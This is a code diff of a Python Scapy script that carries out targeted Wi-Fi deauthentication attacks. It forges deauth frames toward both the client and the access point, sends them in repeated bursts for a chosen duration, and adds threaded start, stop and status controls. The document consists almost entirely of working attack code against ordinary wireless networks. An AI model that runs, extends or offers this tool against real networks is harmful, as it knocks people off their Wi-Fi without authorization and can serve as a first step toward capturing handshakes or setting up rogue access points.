@@ -1,19 +1,19 @@
-from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Deauth
 import time
 import threading
-from datetime import datetime
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Deauth
 
+# Global variables for thread management
+attack_thread = None
+stop_flag = threading.Event()
 
 def create_deauth_packet(target_mac, ap_bssid, reason_code=7):
     """
     Create deauth packets - improved version with both directions
-    
     Args:
         target_mac (str): Target client MAC
         ap_bssid (str): AP BSSID
         reason_code (int): Deauth reason code
-        
     Returns:
         tuple: (packet_to_client, packet_to_ap)
     """
@@ -36,10 +36,10 @@ def create_deauth_packet(target_mac, ap_bssid, reason_code=7):
 def deauth_attack(target_mac, ap_bssid, interface, attack_duration=15):
     """
     Perform targeted deauth attack - improved version
-    
     Args:
         target_mac (str): Target client MAC
         ap_bssid (str): AP BSSID
+        interface (str): Network interface
         attack_duration (int): Attack duration in seconds
     """
     print(f"\n[ATTACK] Starting targeted deauth attack")
@@ -51,20 +51,27 @@ def deauth_attack(target_mac, ap_bssid, interface, attack_duration=15):
     start_time = time.time()
     packets_sent = 0
     
+    # Clear the stop flag before starting
+    stop_flag.clear()
+    
     while time.time() - start_time < attack_duration:
+        # Check if we should stop
+        if stop_flag.is_set():
+            print("\n[INFO] Stop signal received")
+            break
+            
         try:
             # Create deauth packets
             pkt_to_client, pkt_to_ap = create_deauth_packet(target_mac, ap_bssid)
             
             # Send burst of packets
             for _ in range(5):  # Send 5 packets quickly
-                
                 sendp(pkt_to_client, iface=interface, verbose=False)
                 sendp(pkt_to_ap, iface=interface, verbose=False)
                 packets_sent += 2
             
             time.sleep(0.1)  # Brief pause between bursts
-            
+                
         except Exception as e:
             print(f"[ERROR] Error during deauth attack: {e}")
             break
@@ -74,26 +81,59 @@ def deauth_attack(target_mac, ap_bssid, interface, attack_duration=15):
 def start_attack(target_mac, ap_bssid, interface, attack_duration=15):
     """
     Start deauth attack in separate thread
-    
     Args:
         target_mac (str): Target client MAC
         ap_bssid (str): AP BSSID
+        interface (str): Network interface
         attack_duration (int): Attack duration
+    Returns:
+        bool: True if attack started successfully
     """
+    global attack_thread, stop_flag
+    
+    # Stop any existing attack
+    if is_attack_running():
+        print("[WARNING] Previous attack still running, stopping it first...")
+        stop_attack()
+    
+    # Clear the stop flag
+    stop_flag.clear()
+    
+    # Start new attack thread
     attack_thread = threading.Thread(
         target=deauth_attack,
-        args=(target_mac, ap_bssid, interface, attack_duration, )
+        args=(target_mac, ap_bssid, interface, attack_duration)
     )
     attack_thread.daemon = True
     attack_thread.start()
     
     return True
 
-def stop_attack(self):
+def stop_attack():
     """Stop the current attack"""
+    global attack_thread, stop_flag
+    
+    if not is_attack_running():
+        print("[INFO] No attack is currently running")
+        return False
+    
     print("[INFO] Stopping attack...")
+    
+    # Signal the thread to stop
+    stop_flag.set()
+    
+    # Wait for thread to finish (with timeout)
+    if attack_thread and attack_thread.is_alive():
+        attack_thread.join(timeout=5)
         
-    if self.attack_thread and self.attack_thread.is_alive():
-        self.attack_thread.join(timeout=5)
-        
-    print("[INFO] Attack stopped")
+        if attack_thread.is_alive():
+            print("[WARNING] Attack thread did not stop cleanly")
+            return False
+    
+    print("[INFO] Attack stopped successfully")
+    return True
+
+def is_attack_running():
+    """Check if an attack is currently running"""
+    global attack_thread
+    return attack_thread is not None and attack_thread.is_alive()
